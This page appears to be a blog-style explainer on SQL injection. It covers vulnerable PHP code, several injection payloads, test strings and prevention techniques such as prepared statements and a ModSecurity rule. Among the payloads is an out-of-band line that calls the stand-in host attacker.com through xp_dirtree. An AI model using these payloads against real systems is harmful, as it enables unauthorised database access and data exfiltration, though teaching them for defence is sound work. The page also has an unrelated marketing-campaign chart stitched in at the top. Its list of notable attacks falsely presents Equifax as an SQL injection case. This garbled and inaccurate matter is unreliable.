+++
title = "SQL Injection"
date = 2025-11-01
updated = 2025-11-01
description = "SQL injection is a code injection technique that might destroy your database. It is one of the most common web hacking techniques."
tags = ["security", "sql", "injection", "database", "attack"]
+++

{% mermaid() %}
quadrantChart
    title Reach and engagement of campaigns
    x-axis Low Reach --> High Reach
    y-axis Low Engagement --> High Engagement
    quadrant-1 We should expand
    quadrant-2 Need to promote
    quadrant-3 Re-evaluate
    quadrant-4 May be improved
    Campaign A: [0.3, 0.6]
    Campaign B: [0.45, 0.23]
    Campaign C: [0.57, 0.69]
    Campaign D: [0.78, 0.34]
    Campaign E: [0.40, 0.34]
    Campaign F: [0.35, 0.78]
{% end %}

SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.

## How SQL Injection Works

SQL injection occurs when an application incorporates user input into SQL queries without proper validation or parameterization.

### Example of Vulnerable Code

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
```

### Attack Example

An attacker could input:
```
admin' OR '1'='1
```

Resulting in:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

## Types of SQL Injection

### In-band SQL Injection

Direct communication channel for attack and result gathering:

#### Error-based SQL Injection
Exploits database error messages to gather information:

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables) --
```

#### Union-based SQL Injection
Uses UNION SQL operator to combine results:

```sql
' UNION SELECT username, password FROM admin_users --
```

### Inferential SQL Injection (Blind)

No direct data transfer, attacker reconstructs information:

#### Boolean-based Blind
Relies on TRUE/FALSE responses:

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --
```

#### Time-based Blind
Uses database delays to infer information:

```sql
'; IF (1=1) WAITFOR DELAY '00:00:10' --
```

### Out-of-band SQL Injection

Uses different communication channels (DNS, HTTP):

```sql
'; EXEC master.dbo.xp_dirtree '\\attacker.com\share' --
```

## Detection Techniques

### Manual Testing

Common test payloads:

```
'
"
`
')
")
`)
' OR 1=1 --
" OR 1=1 --
```

### Automated Scanning

Tools for SQL injection detection:

- **SQLMap** - Automatic SQL injection exploitation
- **Burp Suite** - Web application security scanner
- **OWASP ZAP** - Web application security scanner
- **Nessus** - Vulnerability scanner

## Prevention Methods

### Parameterized Queries (Prepared Statements)

The most effective defense:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

```java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
```

### Stored Procedures

When implemented correctly:

```sql
CREATE PROCEDURE GetUser
    @Username NVARCHAR(50),
    @Password NVARCHAR(50)
AS
BEGIN
    SELECT * FROM Users
    WHERE Username = @Username AND Password = @Password
END
```

### Input Validation

Whitelist validation:

```python
import re

def validate_username(username):
    pattern = re.compile("^[a-zA-Z0-9_]{3,20}$")
    return pattern.match(username) is not None
```

### Escaping User Input

Last resort method:

```php
$username = mysql_real_escape_string($_POST['username']);
```

### Least Privilege Principle

Database user permissions:

- Don't use administrative accounts for application connections
- Grant only necessary permissions
- Use separate accounts for different application components
- Regularly audit database permissions

## Advanced Prevention

### Web Application Firewalls (WAF)

Filter malicious requests:

```nginx
# ModSecurity rule example
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"
```

### Database Activity Monitoring

Monitor suspicious database activities:

- Unusual query patterns
- Access to sensitive tables
- Failed authentication attempts
- Privilege escalation attempts

## Testing and Verification

### Code Review Checklist

- [ ] All SQL queries use parameterized statements
- [ ] Input validation is implemented
- [ ] Database errors are handled properly
- [ ] Least privilege principle is applied
- [ ] Logging and monitoring are in place

### Penetration Testing

Regular security assessments:

1. **Black box testing** - No knowledge of application internals
2. **White box testing** - Full access to source code and documentation
3. **Gray box testing** - Limited knowledge of application internals

## Real-world Examples

### Notable SQL Injection Attacks

- **2008 - Heartland Payment Systems**: 134 million credit cards compromised
- **2011 - Sony Pictures**: Personal information of 1 million users exposed
- **2012 - Yahoo**: 450,000 passwords stolen from Yahoo Voices
- **2017 - Equifax**: 147 million consumers affected (initially reported as Apache Struts vulnerability)

## Conclusion

SQL injection remains one of the most critical web application vulnerabilities. Prevention requires a multi-layered approach combining secure coding practices, proper input validation, and ongoing security testing.
